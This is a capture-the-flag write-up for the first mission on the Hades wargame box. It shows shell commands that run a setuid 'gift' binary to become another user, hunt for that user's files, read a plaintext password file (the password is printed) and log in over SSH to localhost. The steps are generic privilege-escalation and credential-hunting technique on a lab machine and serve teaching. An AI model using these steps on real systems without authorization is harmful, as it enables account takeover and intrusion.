# 0x01
This write-up explains the steps taken to complete mission 0x01 on hades@hackmyvm.eu, starting from user `hacker` and escalating to `acantha`.

## Mission
The first mission on Hades was presented in the home directory:
```bash
hacker@hades:~$ cat mission.txt 
################
# MISSION 0x01 #
################

## EN ##
User acantha has left us a gift to obtain her powers.
```

## Method of solving
To find this "gift", we searched the entire filesystem for files containing the string "gift" in their name.
```bash
hacker@hades:~$ find / -name "*gift*" 2>/dev/null
/usr/share/man/man1/giftopnm.1.gz
/usr/bin/giftopnm
/opt/gift_hacker
```
The most promising file was `/opt/gift_hacker`. Upon inspecting the permissions in `/opt`, we found that this binary has special permissions set.
```bash
hacker@hades:~$ ls -la /opt/
total 28
drwxr-xr-x 1 root   root    4096 Apr  5  2024 .
drwxr-xr-x 1 root   root    4096 Jan 24 19:48 ..
-rwSr-s--- 1 root   hacker 16064 Apr  5  2024 gift_hacker
-r--r----- 1 ianthe ianthe    21 Apr  5  2024 ianthe_pass.txt
```

By executing this binary, we were granted an initial shell as `acantha`. However, we were in a restricted state where my Group ID (GID) still belonged to `hacker`.
```bash
hacker@hades:/opt$ ./gift_hacker 
acantha@hades:/opt$ id 
uid=2043(acantha) gid=2001(hacker) groups=2001(hacker)
```
To fully compromise the account, we searched for files owned by `acantha` to find her actual login credentials.
```bash
acantha@hades:/opt$ find / -type f -user "acantha" 2>/dev/null
/proc/610775/task/610775/fdinfo/0
/proc/610775/task/610775/fdinfo/1
/proc/610775/task/610775/fdinfo/2
/proc/610775/task/610775/environ
...
/proc/611632/patch_state
/proc/611632/arch_status
/pazz/acantha_pass.txt         <---- This is the file contain acantha_password
```
Because `/usr/bin/su` was restricted, we used the identified password to log in via SSH to `localhost`. This established a "clean" shell with the correct UID and GID.
```bash
acantha@hades:~$ cat /pazz/acantha_pass.txt 
mYYLhLBSkrzZqFydxGkn
acantha@hades:~$ ssh acantha@localhost
...
acantha@hades:~$ id
uid=2043(acantha) gid=2043(acantha) groups=2043(acantha)
```
**Explanation**:
- **SUID and SGID**: The `S` and `s` in the permissions for `gift_hacker` allowed the binary to run with `root` owner privileges and `hacker` group execution rights. This function as a "privilege escalation wrapper" to spawn a shell.
- **File Ownership Search**: Using `find -user` is an essential CTF technique to locate credentials or configuration files left behind by a specific target user.
- **SSH Loopback**: Logging into `localhost` via SSH is a reliable way to bypass restricted commands like `su` and ensure all enviroment variables and group memberships are correctly initialized.

With full access to the account, we can now proceed to the next stage.
```bash
acantha@hades:~$ ls -la
total 48
drwxr-x--- 2 root    acantha  4096 Apr  5  2024 .
drwxr-xr-x 1 root    root     4096 Apr  5  2024 ..
-rw-r--r-- 1 acantha acantha   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 acantha acantha  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 acantha acantha   807 Apr 23  2023 .profile
-rw-r----- 1 root    acantha    22 Apr  5  2024 flagz.txt
-rw-r-x--- 1 root    acantha 16064 Apr  5  2024 guess
-rw-r----- 1 root    acantha   275 Apr  5  2024 mission.txt
```
## Key command
`find / -name "*gift*" 2>/dev/null`

`find / -type f -user "acantha" 2>/dev/null`

`cat /pazz/acantha_pass.txt`

***You are welcome!***
